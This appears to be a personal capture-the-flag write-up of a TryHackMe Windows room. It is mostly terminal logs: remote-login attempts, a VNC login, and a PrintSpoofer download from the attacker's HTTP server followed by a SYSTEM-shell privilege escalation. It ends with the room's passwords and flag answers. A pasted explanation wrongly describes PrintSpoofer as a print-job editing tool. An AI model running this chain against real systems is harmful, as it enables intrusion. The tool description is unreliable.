──(kali㉿kali)-[~/Downloads]
└─$ xfreerdp /v:10.10.77.222 /u:Administrator /p:5upp0rt9 /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp /size:85%
[18:45:24:434] [2314355:2314356] [WARN][com.freerdp.core.nla] - SPNEGO received NTSTATUS: STATUS_LOGON_FAILURE [0xC000006D] from server
[18:45:24:434] [2314355:2314356] [ERROR][com.freerdp.core] - nla_recv_pdu:freerdp_set_last_error_ex ERRCONNECT_LOGON_FAILURE [0x00020014]
[18:45:24:434] [2314355:2314356] [ERROR][com.freerdp.core.rdp] - rdp_recv_callback: CONNECTION_STATE_NLA - nla_recv_pdu() fail
[18:45:24:434] [2314355:2314356] [ERROR][com.freerdp.core.transport] - transport_check_fds: transport->ReceiveCallback() - -1


┌──(kali㉿kali)-[~/Downloads]
└─$ evil-winrm -i 10.10.77.222 -u Administrator -p 5upp0rt9

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type Errno::ECONNREFUSED happened, message is Connection refused - Connection refused - connect(2) for "10.10.77.222" port 5985 (10.10.77.222:5985)

Error: Exiting with code 1

┌──(kali㉿kali)-[~/Downloads]
└─$ xvncviewer 10.10.77.222
Connected to RFB server, using protocol version 3.8
Performing standard VNC authentication
Password: 
Authentication successful
Desktop name "desktop-997gg7d ( 10.10.77.222 ) - service mode"
VNC server default format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Using default colormap which is TrueColor.  Pixel format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0

uhmm slow

PS C:\Installs> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled


┌──(kali㉿kali)-[~/Downloads/ultraVNC_decrypt]
└─$ locate PrintSpoof
/home/kali/ra2/PrintSpoofer.exe
/home/kali/skynet/daily_bugle/PrintSpoofer.exe
                                                                           
┌──(kali㉿kali)-[~/Downloads/ultraVNC_decrypt]
└─$ cp /home/kali/ra2/PrintSpoofer.exe PrintSpoofer.exe

┌──(kali㉿kali)-[~/Downloads/ultraVNC_decrypt]
└─$ python3 -m http.server 8000                        
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.77.222 - - [23/Jan/2023 19:02:26] "GET /PrintSpoofer.exe HTTP/1.1" 200 -

PS C:\Installs> Invoke-WebRequest "http://10.8.19.103:8000/PrintSpoofer.exe" -outfile PrintSpoofer.exe


PS C:\Installs> ./PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 481F-824B

 Directory of C:\Users\Administrator\Desktop

11/14/2020  02:32 PM    <DIR>          .
11/14/2020  02:32 PM    <DIR>          ..
11/14/2020  02:31 PM                54 admin_flag.txt
               1 File(s)             54 bytes
               2 Dir(s)  16,909,467,648 bytes free

C:\Users\Administrator\Desktop>type admin_flag.txt
thm{p455w02d_c4n_83_f0und_1n_p141n_73x7_4dm1n_5c21p75}

The command you provided is using PowerShell on Windows to execute the "PrintSpoofer.exe" file with the "-i" and "-c" options. The "-i" option is likely used to specify an interactive mode, and the "-c" option is likely used to specify a command that should be executed. In this case, the command specified is "cmd" which opens the Command Prompt.

It is important to note that this command is running a file called PrintSpoofer.exe, which is a tool that is able to change the content of print jobs in real-time. It is often used by pentesters or attackers to change the output of a document, it could be dangerous and it's important to know what it does and what are the consequences of running it before actually doing so.

:)

```


What is the Users Password?

The user is automatically logged into the computer

*gKY1uxHLuU1zzlI4wwdAcKUw35TPMdv7PAEE5dAFbV2NxpPJVO7eeSH*

What is the Administrators Password?

*RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi*

What executable is used to run the installer with the Administrator username and password? 

CaSesensitive.exe

*PsExec.exe*

What is the VNC Password?

There are a few versions but some do not work. The version here is known to work: http://aluigi.altervista.org/pwdrec.htm

*5upp0rt9*

![[Pasted image 20230123185003.png]]

What is the contents of the admin_flag.txt?

On the users desktop

*thm{p455w02d_c4n_83_f0und_1n_p141n_73x7_4dm1n_5c21p75}*

### Finishing Up

There are many ways and tools to complete this room and Windows Defender does add to the fun (?). kudo's if you managed to deploy a payload that evaded Defender to get a shell. Hopefully running through this box you have learnt something that you can use in future.

I would like to thank [BigMark82](https://tryhackme.com/p/bigmark82) and [RockShox](https://tryhackme.com/p/RockShox) my partners in crime. Also a shout out to [elbee](https://tryhackme.com/p/elbee) for encouraging me to make a room, check out their room [StartUp](https://tryhackme.com/room/startup) which was fun to do.

Answer the questions below

READ IT


[[OWASP API Security Top 10 - 1]]